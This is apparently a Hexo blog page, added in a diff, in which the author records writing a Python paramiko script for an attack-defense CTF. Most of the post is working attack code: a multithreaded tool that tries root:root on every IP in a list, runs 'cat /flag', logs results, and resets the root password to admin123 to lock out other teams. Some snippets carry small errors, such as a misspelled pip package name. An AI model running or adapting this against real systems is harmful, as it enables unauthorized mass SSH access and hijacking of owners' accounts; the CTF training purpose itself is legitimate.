@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    <title>SSH爆破脚本编写小记\Python paramiko库的学习 | Xiao Leung&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+      <link rel="icon" href="/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+
+  </head>
+
+  <body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+<header>
+	<a id="logo" href="/" title="Xiao Leung&#39;s Blog">
+	<img src="/favicon.png" alt="Xiao Leung&#39;s Blog"></a>
+	
+	
+		<!--搜索栏-->
+		<i class="js-toggle-search iconfont icon-search"></i>
+
+
+<form class="js-search search-form search-form--modal" method="get" action="http://gushi.li" role="search">
+	<div class="search-form__inner">
+		<div>
+			<i class="iconfont icon-search"></i>
+			<input class="text-input" placeholder="Enter Key..." type="search">
+		</div>
+	</div>
+</form>
+	
+
+	
+		<!--侧边导航栏-->
+		<a id="nav-toggle" href="#"><span></span></a>
+
+<nav>
+	<div class="menu-top-container">
+		<ul id="menu-top" class="menu">
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">AboutMe</a>
+				</li>
+			
+		</ul>
+	</div>
+</nav>
+	
+
+</header>
+<div class="m-header ">
+	<section id="hero1" class="hero">
+		<div class="inner">
+		</div>
+	</section>
+	
+		<figure class="top-image" data-enable=true></figure>
+	
+</div>
+
+<!--文章列表-->
+<div class="wrapper">
+  
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      SSH爆破脚本编写小记\Python paramiko库的学习
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在紧张备战AWD线下赛，没什么经验，防止有全场密码一样的情况，直接写脚本cat全场flag，然后修改系统密码。</p>
+<h2 id="编写记录"><a href="#编写记录" class="headerlink" title="编写记录"></a>编写记录</h2><h4 id="paramiko的安装"><a href="#paramiko的安装" class="headerlink" title="paramiko的安装"></a>paramiko的安装</h4><pre><code class="shell">pip install parmiko</code></pre>
+<h4 id="简单的ssh连接例子"><a href="#简单的ssh连接例子" class="headerlink" title="简单的ssh连接例子"></a>简单的ssh连接例子</h4><pre><code class="python">import paramiko
+import sys
+def SshCon(ip,prot,user,passwd):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh.connect(ip,prot,user,passwd,timeout=1.5)
+        stdin, stdout, stderr = ssh.exec_command(&#39;df&#39;)
+        result=stdout.read()
+        if(result):
+            print(&quot;Success&quot;)
+    except Exception as e:
+        pass
+SshCon(&#39;127.0.0.1&#39;,22,&#39;root&#39;,&#39;root&#39;)
+</code></pre>
+<ul>
+<li><p>从例子中不难看出，在执行一条shell后悔返回shell的执行结果，这个结果是字节类型，所以对返回结果处理时候可以转换为字符串类型。</p>
+</li>
+<li><p>修改密码只需执行一条命令</p>
+</li>
+</ul>
+<pre><code class="python">stdin, stdout, stderr = ssh.exec_command(&quot;echo &#39;root:admin123&#39;|chpasswd&quot;)</code></pre>
+<h4 id="多线程对多个IP进行爆破demo"><a href="#多线程对多个IP进行爆破demo" class="headerlink" title="多线程对多个IP进行爆破demo"></a>多线程对多个IP进行爆破demo</h4><pre><code class="python">import threading
+try:
+    import queue
+except:
+    from Queue import Queue
+class Ssh(threading.Thread):
+    def __init__(self,queue):
+        threading.Thread.__init__(self)
+        self._queue=queue
+    def run(self):
+        while not self._queue.empty():
+            try:
+                iplist=self._queue.get()
+                self.SshCon(iplist)
+    def SshCon(self,ip):
+        &#39;&#39;&#39;略&#39;&#39;&#39;
+def main():
+    try:
+        Myqueue = Queue()
+    except:
+        Myqueue = queue.Queue()
+    with open(&quot;ssh.txt&quot;) as dic:
+        for i in dic:
+            Myqueue.put(i.strip(&#39;\n&#39;))
+    threads = []
+    threadsCount=50
+    for i in range(threadsCount):
+        threads.append(Ssh(Myqueue))
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()       </code></pre>
+<h4 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h4><pre><code class="python">#!/usr/bin/env python
+#-*-coding:utf-8-*-
+import paramiko
+import sys
+import threading
+import os
+import time
+try:
+    import queue
+except:
+    from Queue import Queue
+class SshSimplepass(threading.Thread):
+    def __init__(self,queue):
+        threading.Thread.__init__(self)
+        self._queue=queue
+    def run(self):
+        while not self._queue.empty():
+            try:
+                iPlist=self._queue.get()
+                self.SshCheck(iPlist)
+            except:
+                pass
+    def SshCheck(self,ip):
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 跳过了远程连接中选择‘是’的环节,
+        try:
+            ssh.connect(ip, 22, &#39;root&#39;, &#39;root&#39;,timeout=1.5)
+            stdin, stdout, stderr = ssh.exec_command(&#39;df&#39;)
+            result=stdout.read()
+            if not result is None:
+                stdin, stdout, stderr = ssh.exec_command(&#39;cat /flag&#39;)
+                result = str(stdout.read(),encoding=&quot;utf-8&quot;)
+                sys.stdout.write(&#39;\033[5;32m&#39;+&#39;[+]&#39;+&#39;\t&#39;+ip+&#39;\t&#39;+result+&#39;\n&#39;)
+                with open(filename) as file:
+                    if ip not in file.read():
+                        f = open(filename,&#39;a+&#39;)
+                        f.write(ip+&#39;\t&#39;+result)
+                        f.close()
+            stdin, stdout, stderr = ssh.exec_command(&quot;echo &#39;root:admin123&#39;|chpasswd&quot;)
+            print(stdout.read())    
+        except Exception as e:
+            pass
+            #sys.stdout.write(&#39;\033[31m&#39;+&quot;[NOT]&quot;+&#39;\t&#39;+ip+&quot;\n&quot;)    
+        finally:
+            ssh.close()
+def main(threadsCounts):
+    try:
+        Myqueue = Queue()
+    except:
+        Myqueue = queue.Queue()
+
+    with open(&quot;ssh.txt&quot;) as dic:
+        for line in dic:
+            Myqueue.put(line.strip(&#39;\n&#39;))
+    threads=[]
+    threadsCount=int(threadsCounts)
+    for i in range(threadsCount):
+        threads.append(SshSimplepass(Myqueue))
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+if __name__==&#39;__main__&#39;:
+    if len(sys.argv) != 2:
+        sys.stdout.write(&quot;Enter:python %s threads&quot; %(sys.argv[0]))
+    else:
+        path=&quot;result/&quot;
+        filename=path+&#39;/&#39;+str(time.strftime(&quot;%Y-%m-%d&quot;, time.localtime()))+&quot;.txt&quot;
+        isExists=os.path.exists(path)
+        if not isExists:
+            os.makedirs(path)
+        f = open(filename,&quot;a+&quot;)
+        f.close()
+        main(sys.argv[1])</code></pre>
+
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2019-09-21T05:33:29.000Z" itemprop="datePublished">2019-09-21</time>
+	</div>
+</article>
+
+<!--评论-->
+
+	
+<div class="ds-thread" data-thread-key="2019-9-21-SSH爆破脚本编写小记Python-paramiko库的学习" data-title="SSH爆破脚本编写小记\Python paramiko库的学习" data-url="http://www.plasf.cn/2019/09/21/2019-9-21-SSH爆破脚本编写小记Python-paramiko库的学习/"></div>
+<script type="text/javascript">
+
+var duoshuoQuery = {short_name:"yumemor"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0]
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+</script>
+
+
+  
+</div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
+
+
+
+
+
+<div class="fat-footer">
+	<div class="wrapper">
+		<div class="layout layout--center">
+			<div class="layout__item palm-mb">
+				<div class="media">
+					<img class="headimg" src='/assets/blogImg/litten.png' alt='XiaoLeung'>
+					<div class="media__body">
+						<h4>Xiaoleung&#39;s Blog</h4>
+						<p class='site-description'>Don&#39;t forget why we started</p>
+					</div>
+				</div>
+				<div class="author-contact">
+					<ul>
+						
+							
+							<li>
+				        		<a href="https://github.com/sharpleung" target="_blank">
+				        			
+				        				<i class="iconfont icon-github"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<footer class="footer" role="contentinfo">
+	<div class="wrapper wrapper--wide split split--responsive">
+		
+			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
+		
+		<span>Theme by <a href="http://github.com/justpsvm">justpsvm</a>. Powered by <a href="http://hexo.io">Hexo</a></span>
+	</div>
+</footer>
+
+	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
+	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
+	<script src="/js/lib.js"></script>
+	<script src="/js/google-code-prettify/prettify.js"></script>
+	<script src="/js/module.js"></script>
+	<script src="/js/script.js"></script>
+	
+		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+	<script type='text/javascript'>
+		//代码高亮
+		$(document).ready(function(){
+	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   			prettyPrint();
+		});
+	</script>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
